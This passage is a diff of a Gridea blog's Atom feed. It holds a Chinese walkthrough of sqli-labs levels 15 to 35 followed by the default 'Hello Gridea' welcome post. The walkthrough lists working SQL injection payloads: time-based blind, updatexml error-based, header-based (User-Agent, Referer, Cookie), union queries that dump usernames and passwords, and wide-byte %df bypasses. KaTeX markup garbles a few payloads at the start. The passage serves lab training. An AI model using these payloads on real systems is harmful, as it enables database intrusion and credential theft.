class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit<br>
-uname=admin' and if(ascii(substr((select (concat_ws('~',username,password)) from security.users limit <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>,1),<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1))&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>,1,sleep(5))#&amp;passwd=admin&amp;submit=Submit</p>
-<p>less-16</p>
-<p>payload:<br>
-uname=admin&quot; &amp;passwd=admin&amp;submit=Submit<br>
-剩余同less-15</p>
-<p>less-17<br>
-从报错发现，用户名加入单引号，则这个单引号会被转义，所以查看代码发现check_input()过滤了uname，所以从passwd进行报错注入<br>
-payload：<br>
-uname=admin&amp;passwd=admin' #&amp;submit=Submit<br>
-uname=admin&amp;passwd=admin' and updatexml(1,concat(0x7e,database(),0x7e),1)%23#&amp;submit=Submit<br>
-剩余同less-13</p>
-<p>less-18</p>
-<p>payload:<br>
-uname=admin' #&amp;passwd=admin&amp;submit=Submit<br>
-uname=admin&amp;passwd=admin' #&amp;submit=Submit//得知会对username，password进行转义<br>
-//由题目提示，与User-Agent有关，从这里入手<br>
-' or updatexml(1,concat(0x7e,database(),0x7e),1) or '1'='1//查看数据库<br>
-' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '1'='1<br>
-' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) or '1'='1<br>
-' or updatexml(1,concat(0x7e,(select (concat_ws('~',username,password)) from users limit 0,1),0x7e),1) or '1'='1</p>
-<p>“基于’的“User-Agent:”报头文报错注入”</p>
-<p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
-<p>less-19</p>
-<p>“基于‘的“Referer:”报头文报错注入”<br>
-同less 18 将“User-Agent:”改为“Referer:”</p>
-<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。<br>
-Request.ServerVariables(&quot;HTTP_REFERER&quot;)的用法是防外连接。</p>
-<p>less-20</p>
-<p>“基于‘的“Cookie:”报头文报错注入”<br>
-payload:<br>
-' union select 1,2,group_concat(schema_name)from information_schema.schemata#<br>
-' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'#<br>
-' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'#<br>
-' union select 1,2,group_concat(concat_ws('~',username,password))from security.users#</p>
-<p>less-21</p>
-<p>登陆后发现uname为看不懂的字符，查看源码后发现它会将cookie进行BASE64转码<br>
-将uname=admin加'再进行BASE64转码后发送，看到包裹信息为'),找到注入点<br>
-（可以使用burp抓包在进行转码）<br>
-剩余同less-20</p>
-<p>less-22</p>
-<p>同less-21一样查看包裹信息为&quot;<br>
-剩余同less-21需要进行BASE64编码后</p>
-<p>less23</p>
-<p>无法注释<br>
-，用or 1=1闭合<br>
-，，用特殊注释符;%00注释<br>
-,,,updatexml<br>
-同less1</p>
-<p>less24</p>
-<p>二次注入<br>
-二次注入原理<br>
-二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
-<p>二次注入，可以概括为以下两步:</p>
-<p>第一步：插入恶意数据<br>
-进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
-<p>第二步：引用恶意数据<br>
-开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
-<p>less25包裹<br>
-or and双写绕过<br>
-后|| 1=1闭合</p>
-<p>less25a无包裹</p>
-<p>less26</p>
-<p>or and， 双写<br>
---+注释，;%00<br>
-空格，()包裹，|| 1=1闭合，%a0<br>
-报错注入</p>
-<p>less26a('')</p>
-<p>不能报错<br>
-联合注入</p>
-<p>less27a</p>
-<p>1.双引号字符型注入<br>
-2.没有错误回显，不能进行报错注入，即无法使用updatexml函数等，但可以进行布尔盲注，因为他有无错误回显，即正确和错误页面返回的页面不同。<br>
-3.可以使用union联合注入，延时盲注。<br>
-这里演示一下联合注入，其他自行尝试：</p>
-<p>less28</p>
-<p>发现没有过滤or与and。<br>
-过滤了相连的union和select，/i同时匹配大小写，\s匹配任意空白字符如制表符、换行符、空格等，使用%a0等空格的URL编码可以绕过。<br>
-过滤了--、#以及/**/。<br>
-过滤了两次空格。<br>
-过滤了/但没过滤\。<br>
-这一关和Less-27a十分相似，可以利用联合注入，布尔盲注，延时注入。</p>
-<p>less28a</p>
-<p>带括号的双引号字符型注入</p>
-<p>less27发现没有过滤or与and，过滤了几个大小写的union和select但是可以用随机大小写绕过，过滤了--、#以及/**/，过滤了两次空格，过滤了/但没过滤\。<br>
-所以实际上只过滤了注释与空格，与 Less 26 相似。</p>
-<p>less-29</p>
-<p>使用jspstudy搭建环境，否则会与less-1一致<br>
-下载安装jspstudy后，修改端口为8080，在PHPstudy根目录下找到（/sqli-labs中的tomlat-fils.zip&lt;29~32&gt;解压至jsp根目录，之后打开index.jsp确认URL。</p>
-<p>payload：<br>
-127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=1//正确界面<br>
-127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1'&amp;id=1//提示WAF防御<br>
-127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=1'//报错发现注入点<br>
-127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=1和127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=2//查看信息<br>
-127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=1' --+//无异常<br>
-127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=1' order by X(X=1,2,3,4) --+//列信息有三列<br>
-127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=-3' union select 1,2,3 --+//联合注入</p>
-<p>less-30<br>
-（与29相比单引包裹变双引包裹）<br>
-但是没有报错信息，无法使用报错注入，可使用联合注入，延时注入</p>
-<p>less-31<br>
-与29相比单引包裹变双引单括号）<br>
-报错注入，联合注入，延时注入</p>
-<p>知识点：服务器两层架构<br>
-参考：https://www.cnblogs.com/lcamry/p/5762961.html</p>
-<p>less-32</p>
-<p>此关会对单引号进行转义（自定义过滤）</p>
-<p>方法1：payload（宽字节）<br>
--1%df' union select 1,2,3 --+联合注入<br>
-(语句中存在单引号的地方也需使用%df)</p>
-<p>方法2：payload（自定义闭合）<br>
--1%aa%5c%27 union select 1,2,3 --+联合注入<br>
-(%5c:)(%27:')</p>
-<p>less-33</p>
-<p>addslaches(&quot;)//对双引号进行转义</p>
-<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
-<p>预定义字符是：</p>
-<pre><code>单引号（'）
-双引号（&quot;）
-反斜杠（\）
-NULL
-</code></pre>
-<p>(%22:&quot;)payload:同32</p>
-<p>知识点：宽字节注入<br>
-参考文章：https://blog.csdn.net/helloc0de/article/details/76180190<br>
-https://blog.csdn.net/heiseweiye/article/details/82723478</p>
-<p>宽字节：GB2312、GBK、GB18030、B1G5、Shift_JIS等这选都是常说的宽辛节，实际上只有两字节。宽字节带来的安全问题主要是ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。<br>
-中文、韩文、日文等均存在宽字节，英文默认都是一个字节。<br>
-在使用PHP连接MySQL的时候，当设置&quot;set character_set_client=gbk&quot;时会导致一个编码转换的问题。<br>
-例子： id=1'  处理 1'     进行编码1%5c%27    带入sql后 id=' and XXXX 此时无法完成注入<br>
-id=1%df'  处理 1%df'     进行编码1%df%5c%27    带入sql后 id=1運' and XXXX 此时存在宽字节注入<br>
-推荐解码网站：http://www.mytju.com/classcode/tools/urldecode gb2312.asp</p>
-<p>less-34</p>
-<p>POST方式下进行<br>
-使用Burp进行抓包之后，修改并返回信息<br>
-传入数据：a%df'<br>
-抓包数据：uname=a%25df%2527&amp;passwd=a%25df%2527&amp;submit=Submit<br>
-修改数据：uname=a%df%27&amp;passwd=a%df%27&amp;submit=Submit<br>
-(%25:%)</p>
-<p>less-35</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Hello Gridea]]></title>
-        <id>https://kite-007.github.io/post/hello-gridea/</id>
-        <link href="https://kite-007.github.io/post/hello-gridea/">
-        </link>
-        <updated>2018-12-11T16:00:00.000Z</updated>
-        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-<!-- more -->
-<p><a href="https://github.com/getgridea/gridea">Github</a><br>
-<a href="https://gridea.dev/">Gridea 主页</a><br>
-<a href="http://fehey.com/">示例网站</a></p>
-<h2 id="特性">特性👇</h2>
-<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
-<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
-<p>🏷️  你可以对文章进行标签分组</p>
-<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
-<p>💻  你可以在 <strong>Windows</strong>，<strong>MacOS</strong> 或 <strong>Linux</strong> 设备上使用此客户端</p>
-<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
-<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
-<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
-<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
-<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
-<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前 🏃</p>
-<p>未来，它一定会成为你离不开的伙伴</p>
-<p>尽情发挥你的才华吧！</p>
-<p>😘 Enjoy~</p>
 ]]></content>
     </entry>
 </feed>
